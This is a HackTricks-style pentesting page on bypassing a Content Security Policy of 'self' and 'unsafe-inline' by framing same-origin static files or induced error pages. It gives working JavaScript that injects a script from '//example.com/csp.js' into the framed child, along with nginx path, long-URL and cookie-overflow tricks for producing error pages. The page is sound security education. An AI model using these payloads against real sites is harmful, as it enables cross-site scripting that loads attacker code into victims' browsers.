---
title: "CSP bypass: self + 'unsafe-inline' with Iframes"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

# CSP Bypass via `'self'`, `'unsafe-inline'`, and Iframes

`'self'`, `'unsafe-inline'`, and Iframes

```
Content-Security-Policy: default-src 'self' 'unsafe-inline';
```
## Via Text & Images

Some browser and server combinations render a same-origin text or image response placed in an iframe as a document. Common candidates include `robots.txt`, `favicon.ico`, stylesheets, and other static resources. If that response has no CSP of its own and remains same-origin, script in the parent may be able to access the child DOM and append a script element. This behavior is content-type-, header-, and browser-dependent; verify it on the exact target rather than treating it as universal.[\[2\]](#references)

```
frame = document.createElement("iframe")
frame.onload = () => {
  script = document.createElement("script")
  script.src = "//example.com/csp.js"
  frame.contentDocument.head.appendChild(script)
}
frame.src = "/css/bootstrap.min.css"
document.body.appendChild(frame)
```
## Via Errors

An application or reverse proxy may also return same-origin error documents without the normal CSP. If such a response can be framed and accessed by the parent, it can provide the same less-restricted child context.[\[2\]](#references)

```
// Inducing an nginx error
frame = document.createElement("iframe")
frame.src = "/%2e%2e%2f"
document.body.appendChild(frame)
// Triggering an error with a long URL
frame = document.createElement("iframe")
frame.src = "/" + "A".repeat(20000)
document.body.appendChild(frame)
// Generating an error via extensive cookies
for (var i = 0; i < 5; i++) {
  document.cookie = i + "=" + "a".repeat(4000)
}
frame = document.createElement("iframe")
frame.src = "/"
document.body.appendChild(frame)
// Remove the test cookies after execution.
for (var i = 0; i < 5; i++) {
  document.cookie = i + "=; Max-Age=0; path=/"
}
```
When using one of the error responses, attach the handler before navigating the frame so that the child document is fully loaded before it is modified:

```
frame.onload = () => {
  script = document.createElement("script")
  script.src = "//example.com/csp.js"
  frame.contentDocument.head.appendChild(script)
}
```
## References

- [1] [W3C - Content Security Policy Level 3](https://www.w3.org/TR/CSP/)
- [2] [Wallarm - How to trick CSP into letting you run external JavaScript](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
